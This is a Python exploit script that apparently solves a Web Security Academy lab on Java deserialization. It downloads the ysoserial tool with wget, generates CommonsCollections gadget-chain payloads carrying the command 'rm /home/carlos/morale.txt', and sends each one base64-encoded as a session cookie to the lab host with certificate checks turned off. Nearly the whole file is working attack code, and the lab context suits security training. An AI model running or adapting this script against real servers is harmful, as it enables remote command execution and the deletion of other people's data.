import base64
import http.client
import os.path
import ssl
import subprocess
import time
import urllib.parse

LAB_ID = "???"


def GET_(session: str) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}'
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


command = 'rm /home/carlos/morale.txt'
payloads = [
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsCollections5",
    "CommonsCollections6",
    "CommonsCollections7",
]

if not os.path.isfile("ysoserial-all.jar"):
    subprocess.check_output(['wget', 'https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar'])
    time.sleep(1)

for payload in payloads:
    print(f"trying {payload} payload")
    print("========================================================")
    try:
        generatedPayload = base64.b64encode(
            subprocess.check_output(['java', '-jar', 'ysoserial-all.jar', payload, command])
        )
    except:
        print(f"failed to generate payload {payload}")
        continue
    response = GET_(session=urllib.parse.quote(generatedPayload))
    print(response.status)
    for name, header in response.headers.items():
        print(f"{name}: {header}")
    print(response.read().decode())
    time.sleep(1)
